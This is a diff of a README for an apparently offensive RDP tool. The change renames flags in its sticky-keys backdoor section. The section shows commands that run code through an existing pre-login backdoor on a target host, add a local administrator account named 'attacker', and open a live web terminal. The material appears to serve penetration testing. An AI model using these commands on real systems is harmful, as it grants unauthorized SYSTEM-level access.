@@ -561,28 +561,28 @@ sethc.exe has been replaced with cmd.exe or similar.
 SYSTEM-level unauthenticated access available via 5x Shift.
 ```
 
-### Command Execution via Sticky Keys (`--sticky-keys-exec`)
+### Command Execution via Backdoor (`--exec`)
 
 Once a backdoor is detected, execute a command on the remote system through the pre-auth command prompt:
 
 ```bash
 # Execute a single command via the backdoor
-brutus logon --target 10.0.0.50:3389 --sticky-keys-exec "whoami"
+brutus logon --target 10.0.0.50:3389 --exec "whoami"
 
 # Add a local admin account
 brutus logon --target 10.0.0.50:3389 \
-  --sticky-keys-exec "net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
+  --exec "net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
 ```
 
 This connects, triggers the backdoor, types the command, presses Enter, waits for output, and saves a PNG screenshot of the result.
 
-### Interactive Web Terminal (`--sticky-keys-web`)
+### Interactive Web Terminal (`--web`)
 
 Launch a browser-based RDP viewer for live interaction with the backdoor command prompt:
 
 ```bash
 # Start interactive web terminal
-brutus logon --target 10.0.0.50:3389 --sticky-keys-web
+brutus logon --target 10.0.0.50:3389 --web
 ```
 
 This starts a local HTTP server with:
